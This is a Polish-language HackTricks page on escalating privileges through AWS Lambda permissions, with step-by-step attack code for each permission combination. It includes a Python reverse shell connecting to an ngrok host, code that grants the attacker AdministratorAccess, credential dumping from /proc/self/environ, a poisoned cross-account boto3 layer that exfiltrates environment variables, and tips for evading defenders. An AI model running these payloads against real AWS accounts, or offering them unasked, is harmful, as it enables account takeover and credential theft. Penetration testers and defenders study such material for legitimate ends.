# AWS - Eskalacja uprawnień w Lambda

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakowania, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## lambda

Więcej informacji na temat lambdy znajdziesz w:

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Użytkownicy posiadający uprawnienia **`iam:PassRole`, `lambda:CreateFunction` i `lambda:InvokeFunction`** mogą eskalować swoje uprawnienia.\
Mogą **utworzyć nową funkcję Lambda i przypisać jej istniejącą rolę IAM**, nadając funkcji uprawnienia związane z tą rolą. Użytkownik może następnie **napisać i przesłać kod do tej funkcji Lambda (na przykład z odwróconym powłokiem)**.\
Gdy funkcja jest skonfigurowana, użytkownik może **wywołać jej wykonanie** i zamierzone działania, wywołując funkcję Lambda za pośrednictwem interfejsu API AWS. Ten sposób pozwala użytkownikowi efektywnie wykonywać zadania pośrednio za pośrednictwem funkcji Lambda, działając na poziomie dostępu przyznanego roli IAM z nią związanej.\\

Atakujący mógłby wykorzystać to do uzyskania **odwróconej powłoki i kradzieży tokena**:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Możesz również **nadużyć uprawnień roli lambdy** bezpośrednio z funkcji lambdy.\
Jeśli rola lambdy miała wystarczające uprawnienia, możesz ich użyć do przyznania sobie uprawnień administratora:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
Możliwe jest również ujawnienie poświadczeń roli lambdy bez konieczności zewnętrznego połączenia. Byłoby to przydatne dla **Lambd z izolacją sieciową** używanych do zadań wewnętrznych. Jeśli nieznane grupy zabezpieczeń filtrowują twoje odwrócone powłoki, ten fragment kodu pozwoli ci bezpośrednio ujawnić poświadczenia jako wynik lambdy.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Potencjalny wpływ:** Bezpośrednie podniesienie uprawnień do określonej roli usługi lambda.

{% hint style="danger" %}
Należy zauważyć, że nawet jeśli może to wydawać się interesujące **`lambda:InvokeAsync`**, to **nie** pozwala samodzielnie **wykonać `aws lambda invoke-async`**, potrzebujesz również `lambda:InvokeFunction`
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Podobnie jak w poprzednim scenariuszu, możesz **przyznać sobie uprawnienie `lambda:InvokeFunction`** jeśli masz uprawnienie **`lambda:AddPermission`**
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Potencjalne skutki:** Bezpośrednie podniesienie uprawnień do określonej roli usługi Lambda.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Użytkownicy posiadający uprawnienia **`iam:PassRole`, `lambda:CreateFunction` oraz `lambda:CreateEventSourceMapping`** (i potencjalnie `dynamodb:PutItem` oraz `dynamodb:CreateTable`) mogą pośrednio **podnieść uprawnienia**, nawet bez `lambda:InvokeFunction`.\
Mogą utworzyć funkcję **Lambda z złośliwym kodem i przypisać jej istniejącą rolę IAM**.

Zamiast bezpośredniego wywoływania funkcji Lambda, użytkownik konfiguruje lub wykorzystuje istniejącą tabelę DynamoDB, łącząc ją z Lambdą poprzez mapowanie źródła zdarzeń. Ta konfiguracja zapewnia, że funkcja Lambda jest **automatycznie wyzwalana po dodaniu nowego elementu** do tabeli, zarówno przez działanie użytkownika, jak i inny proces, co pośrednio wywołuje funkcję Lambda i wykonuje kod z uprawnieniami przekazanej roli IAM.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Jeśli DynamoDB jest już aktywny w środowisku AWS, użytkownik musi jedynie **ustanowić mapowanie źródła zdarzeń** dla funkcji Lambda. Jednakże, jeśli DynamoDB nie jest używany, użytkownik musi **utworzyć nową tabelę** z włączonym strumieniowaniem:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Teraz jest możliwe **połączenie funkcji Lambda z tabelą DynamoDB** poprzez **utworzenie mapowania źródła zdarzeń**:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Z funkcją Lambda połączoną ze strumieniem DynamoDB, atakujący może **pośrednio uruchomić funkcję Lambda aktywując strumień DynamoDB**. Można to osiągnąć przez **wstawienie elementu** do tabeli DynamoDB:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Potencjalne skutki:** Bezpośrednie podniesienie uprawnień do określonej roli usługi lambda.

### `lambda:AddPermission`

Atakujący posiadający te uprawnienia może **przyznać sobie (lub innym) dowolne uprawnienia** (co generuje polityki oparte na zasobach w celu przyznania dostępu do zasobu):

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**Potencjalne skutki:** Bezpośrednie podniesienie uprawnień do roli usługi lambda poprzez nadanie uprawnienia do modyfikacji kodu i jego uruchamiania.

### `lambda:AddLayerVersionPermission`

Atakujący posiadający to uprawnienie może **nadać sobie (lub innym) uprawnienie `lambda:GetLayerVersion`**. Może uzyskać dostęp do warstwy i wyszukiwać podatności lub poufne informacje.

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**Potencjalne skutki:** Potencjalny dostęp do poufnych informacji.

### `lambda:UpdateFunctionCode`

Użytkownicy posiadający uprawnienie **`lambda:UpdateFunctionCode`** mają potencjał do **modyfikacji kodu istniejącej funkcji Lambda powiązanej z rolą IAM.**\
Atakujący może **zmodyfikować kod lambdy w celu wycieku poświadczeń IAM**.

Mimo że atakujący może nie mieć bezpośredniej możliwości wywołania funkcji, jeśli funkcja Lambda jest już istniejąca i operacyjna, jest prawdopodobne, że zostanie uruchomiona poprzez istniejące przepływy pracy lub zdarzenia, ułatwiając tym samym wykonanie zmodyfikowanego kodu.

{% code overflow="wrap" %}
```bash
# Thezip should contain the lambda code (trick: DOwnload the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
{% endcode %}

**Potencjalne skutki:** Bezpośrednie podniesienie uprawnień do roli usługi lambda używanej.

### `lambda:UpdateFunctionConfiguration`

#### Wprowadzenie

[**Warstwy Lambda**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) pozwalają na dołączenie **kodu** do funkcji lambda, ale **przechowywanie go osobno**, dzięki czemu kod funkcji może pozostać niewielki, a **kilka funkcji może współdzielić kod**.

Wewnątrz lambdy można sprawdzić ścieżki, z których ładowany jest kod Python za pomocą funkcji takiej jak poniższa:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
Oto miejsca:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Na przykład, biblioteka boto3 jest ładowana z `/var/runtime/boto3` (4. pozycja).

#### Wykorzystanie

**Dołączenie warstwy do funkcji** wymaga jedynie uprawnienia `lambda:UpdateFunctionConfiguration`, a **warstwy mogą być udostępniane między kontami**. Musielibyśmy również wiedzieć, **jakie biblioteki są używane**, abyśmy mogli je poprawnie nadpisać, ale w tym przykładzie **założymy, że atakowana funkcja importuje boto3**.

Dla pewności, użyjemy Pipy, aby zainstalować tę samą wersję biblioteki boto3 z czasu uruchomienia Lambdy, na którą się skupiamy (Python 3.7), aby nie było niczego innego, co mogłoby powodować problemy w funkcji docelowej. Obecnie czas uruchomienia używa wersji boto3 1.9.42.

Z poniższym kodem zainstalujemy bibliotekę boto3 w wersji 1.9.42 i jej zależności do lokalnego folderu "lambda\_layer":
```
pip3 install -t ./lambda_layer boto3==1.9.42
```
Następnie otworzymy `/lambda_layer/boto3/__init__.py` i dodamy złośliwy kod. Payload, który dodamy, wygląda tak:

![](<../../../.gitbook/assets/image (26).png>)

`requests` jest importowany z `botocore`. Funkcja będzie eksfiltrować zmienne środowiskowe, a try-except oraz 0.1 timeout mają zapewnić, że ten kod nie spowoduje awarii.

{% hint style="info" %}
**Ważna uwaga:** Nie powinieneś już używać `from botocore.vendored import requests` podczas rzeczywistych testów penetracyjnych, ponieważ w dziennikach CloudWatch tej funkcji zostanie wydrukowane ostrzeżenie o deprecjacji, co prawdopodobnie spowoduje, że zostaniesz wykryty przez obrońcę.
{% endhint %}

Teraz spakuj ten kod do pliku **ZIP** i **załaduj** go do **nowej warstwy Lambda w koncie ATAKUJĄCEGO**. Najpierw musisz utworzyć folder „python” i umieścić w nim swoje biblioteki, aby po załadowaniu ich do Lambdy kod można było znaleźć pod „/opt/python/boto3”. Upewnij się również, że warstwa jest zgodna z Pythonem 3.7 i że **warstwa znajduje się w tym samym regionie co nasza funkcja docelowa**. Gdy to zrobisz, użyj `lambda:AddLayerVersionPermission`, aby **udostępnić warstwę publicznie**, dzięki czemu nasze konto docelowe będzie mogło z niej korzystać. Użyj swoich osobistych poświadczeń AWS do tego wywołania API.
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
Teraz, z **skompromitowanymi poświadczeniami**, które posiadamy, uruchomimy następujące polecenie na naszej docelowej funkcji Lambda "s3-getter", które **dołączy naszą warstwę Lambda międzykontową**.
```bash
aws lambda update-function-configuration \
--function-name s3-getter \
--layers arn:aws:lambda:REGION:OUR-ACCOUNT-ID:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
Następnym krokiem będzie albo **wywołanie funkcji** samodzielnie, jeśli jest to możliwe, albo oczekiwanie, aż zostanie **wywołana** w normalny sposób - co jest bezpieczniejszą metodą.

**Bardziej skrytym sposobem na wykorzystanie tej podatności** można znaleźć w:

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**Potencjalne skutki:** Bezpośrednie podniesienie uprawnień do roli usługi lambda używanej.

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Może być możliwe utworzenie funkcji i jej wykonanie, wywołując URL... ale nie mogłem znaleźć sposobu, aby to przetestować, więc daj mi znać, jeśli uda Ci się to zrobić!

### Lambda MitM

Niektóre lambdy będą **otrzymywać wrażliwe informacje od użytkowników w parametrach.** Jeśli uzyskasz RCE w jednej z nich, możesz wyciekać informacje, które inni użytkownicy wysyłają do niej, sprawdź to w:

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## Odnośniki

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

<details>

<summary><strong>Dowiedz się, jak hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
